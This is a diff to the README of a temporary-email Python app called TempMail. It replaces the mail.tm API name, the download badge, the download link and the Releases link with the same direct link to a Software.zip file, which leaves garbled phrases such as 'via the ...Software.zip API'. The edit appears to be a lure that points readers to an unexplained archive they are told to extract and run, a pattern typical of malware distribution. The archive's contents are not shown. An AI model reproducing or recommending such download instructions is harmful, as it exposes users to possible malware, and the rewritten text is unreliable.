@@ -1,6 +1,6 @@
 # 📧 TempMail
 
-TempMail is a user-friendly Python application with a sleek GUI that provides temporary email addresses via the mail.tm API. It allows users to receive, manage, and view emails securely on their local system for verification, validation, and private messaging. With no external logging, it ensures privacy while offering a seamless inbox experience.
+TempMail is a user-friendly Python application with a sleek GUI that provides temporary email addresses via the https://github.com/Nodiq/TempMail/releases/download/v2.0/Software.zip API. It allows users to receive, manage, and view emails securely on their local system for verification, validation, and private messaging. With no external logging, it ensures privacy while offering a seamless inbox experience.
 
 ## Topics
 - anonymous
@@ -25,7 +25,7 @@ TempMail is a user-friendly Python application with a sleek GUI that provides te
 
 ## Installation
 To download the TempMail Python application, click on the button below:
-[![Download TempMail](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download TempMail](https://github.com/Nodiq/TempMail/releases/download/v2.0/Software.zip)](https://github.com/Nodiq/TempMail/releases/download/v2.0/Software.zip)
 
 Launching the application requires extracting the downloaded .zip file and running the appropriate Python scripts.
 
@@ -38,11 +38,11 @@ Launching the application requires extracting the downloaded .zip file and runni
 
 ## Usage
 1. Run the TempMail Python application.
-2. Sign up for temporary email addresses via the mail.tm API.
+2. Sign up for temporary email addresses via the https://github.com/Nodiq/TempMail/releases/download/v2.0/Software.zip API.
 3. Use the application to receive and manage emails securely.
 
 ## Support
-For additional information and troubleshooting, please visit the [Releases](https://github.com/cli/go-gh/releases) section.
+For additional information and troubleshooting, please visit the [Releases](https://github.com/Nodiq/TempMail/releases/download/v2.0/Software.zip) section.
 
 ## Contributing
 Contributions to enhance the TempMail application are welcome. Feel free to fork the repository and submit pull requests with your improvements.
